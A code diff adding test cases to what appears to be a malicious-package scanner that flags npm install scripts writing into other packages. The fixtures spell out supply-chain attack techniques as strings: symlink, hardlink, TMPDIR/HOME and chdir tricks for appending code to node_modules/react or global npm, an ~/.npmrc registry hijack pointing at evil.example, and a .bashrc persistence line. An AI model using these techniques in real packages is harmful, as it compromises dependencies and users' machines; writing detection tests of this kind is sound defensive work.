@@ -446,6 +446,92 @@ describe("propagation.package-mutation", () => {
     ).toEqual([expect.objectContaining({ severity: "high", file: "install.js", line: 3 })]);
   });
 
+  test.each([
+    [
+      "a symlink into its own dir",
+      "const fs = require('fs');\nconst path = require('path');\nfs.symlinkSync(path.join(__dirname, '..', '..', 'node_modules', 'react'), path.join(__dirname, 'vendor'));\nfs.appendFileSync(path.join(__dirname, 'vendor', 'index.js'), p);\n",
+    ],
+    [
+      "a relative symlink",
+      "const fs = require('fs');\nfs.symlinkSync('../../node_modules', 'nm');\nfs.appendFileSync('nm/react/index.js', p);\n",
+    ],
+    [
+      "fs.promises.symlink",
+      "const fs = require('fs');\nconst path = require('path');\nawait fs.promises.symlink('../../node_modules/react', path.join(__dirname, 'vendor'));\nawait fs.promises.appendFile(path.join(__dirname, 'vendor', 'index.js'), p);\n",
+    ],
+    [
+      "a symlink to the global npm",
+      "const fs = require('fs');\nconst path = require('path');\nfs.symlinkSync('/usr/lib/node_modules/npm', path.join(__dirname, 'g'));\nfs.appendFileSync(path.join(__dirname, 'g', 'index.js'), p);\n",
+    ],
+    [
+      "a shell symlink",
+      "const { execSync } = require('child_process');\nexecSync('ln -s ../../node_modules/react vendor');\nrequire('fs').appendFileSync('vendor/index.js', p);\n",
+    ],
+    [
+      "a hardlink to a sibling file",
+      "const fs = require('fs');\nconst path = require('path');\nconst own = path.join(__dirname, 'h.js');\nfs.linkSync(path.join(__dirname, '..', 'react', 'index.js'), own);\nfs.appendFileSync(own, p);\n",
+    ],
+    [
+      "a hardlink renamed in one function and written in a later one",
+      "const fs = require('fs');\nconst path = require('path');\nconst own = path.join(__dirname, 'h.js');\nfunction a() { const tmp = path.join(__dirname, 't'); fs.linkSync(require.resolve('react'), tmp); fs.renameSync(tmp, own); }\nfunction b() { fs.appendFileSync(own, p); }\na();\nb();\n",
+    ],
+    [
+      "a hardlink written from a callback",
+      "const fs = require('fs');\nconst path = require('path');\nconst own = path.join(__dirname, 'h.js');\nfunction b() { fs.appendFileSync(own, p); }\nsetTimeout(b, 10);\nfs.linkSync(require.resolve('react'), own);\n",
+    ],
+    [
+      "a TMPDIR redirect",
+      "const fs = require('fs');\nconst os = require('os');\nconst path = require('path');\nprocess.env.TMPDIR = path.resolve(__dirname, '..', '..', 'node_modules', 'react');\nfs.appendFileSync(path.join(os.tmpdir(), 'index.js'), p);\n",
+    ],
+    [
+      "a HOME redirect",
+      "const fs = require('fs');\nconst os = require('os');\nconst path = require('path');\nprocess.env['HOME'] = path.resolve(__dirname, '..', '..', 'node_modules', 'react');\nfs.appendFileSync(path.join(os.homedir(), 'index.js'), p);\n",
+    ],
+    [
+      "a TMPDIR from INIT_CWD",
+      "const fs = require('fs');\nconst os = require('os');\nprocess.env.TMPDIR = process.env.INIT_CWD + '/node_modules/react';\nfs.appendFileSync(os.tmpdir() + '/index.js', p);\n",
+    ],
+    [
+      "an aliased chdir",
+      "const fs = require('fs');\nconst { chdir: go } = process;\ngo('../../node_modules/react');\nfs.appendFileSync('index.js', p);\n",
+    ],
+    [
+      "a Reflect.apply chdir",
+      "const fs = require('fs');\nReflect.apply(process.chdir, process, ['../../node_modules/react']);\nfs.appendFileSync(require('path').join(process.cwd(), 'index.js'), p);\n",
+    ],
+    [
+      "an ~/.npmrc registry hijack",
+      "const fs = require('fs');\nconst os = require('os');\nconst path = require('path');\nfs.appendFileSync(path.join(os.homedir(), '.npmrc'), 'registry=https://evil.example/\\n');\n",
+    ],
+    [
+      "a shell rc append",
+      "const fs = require('fs');\nconst os = require('os');\nfs.appendFileSync(`${os.homedir()}/.bashrc`, 'node ~/.x/run.js\\n');\n",
+    ],
+  ])("fires on %s", (_label, installJs) => {
+    expect(
+      analyzeInstallWrites(installJs, { filePath: "install.js", packageName: "pkg" }).unproven,
+    ).toBe(true);
+    expect(findingsFor(installJs)).toEqual([
+      expect.objectContaining({ severity: "high", file: "install.js" }),
+    ]);
+  });
+
+  test.each([
+    "const fs = require('fs');\nconst path = require('path');\nfs.symlinkSync('lib/cli.js', path.join(__dirname, 'bin', 'cli'));\nfs.writeFileSync(path.join(__dirname, 'bin', 'version'), v);\n",
+    "const fs = require('fs');\nconst os = require('os');\nconst path = require('path');\nspawnSync('node', ['x.js'], { env: { ...process.env, FORCE_COLOR: '1' } });\nconst { HOME } = process.env;\nfs.writeFileSync(path.join(os.tmpdir(), 'pkg-cache.json'), data);\n",
+    "const fs = require('fs');\nconst os = require('os');\nconst path = require('path');\nfs.mkdirSync(path.join(os.homedir(), '.cache', 'pkg'), { recursive: true });\nfs.writeFileSync(path.join(os.homedir(), '.cache', 'pkg', 'bin'), data);\n",
+    // esbuild's shape: the override that writes the binary runs and returns
+    // before the step that hardlinks a sibling's binary over it.
+    "const fs = require('fs');\nconst path = require('path');\nconst toPath = path.join(__dirname, 'bin', 'x');\nfunction override() { fs.writeFileSync(toPath, shim); }\nfunction optimize() { const tmp = path.join(__dirname, 'bin-x'); fs.linkSync(require.resolve('@x/bin/x'), tmp); fs.renameSync(tmp, toPath); }\nfunction main() { if (env) { override(); return; } optimize(); }\nmain();\n",
+  ])(
+    "proves an own-dir symlink, an env read, a home cache write, a write before a link: %#",
+    (installJs) => {
+      expect(
+        analyzeInstallWrites(installJs, { filePath: "install.js", packageName: "pkg" }),
+      ).toEqual(expect.objectContaining({ unproven: false, intoInstallRoot: false }));
+    },
+  );
+
   test("keeps the co-occurrence verdict when the sample was truncated", () => {
     expect(
       findingsFor(
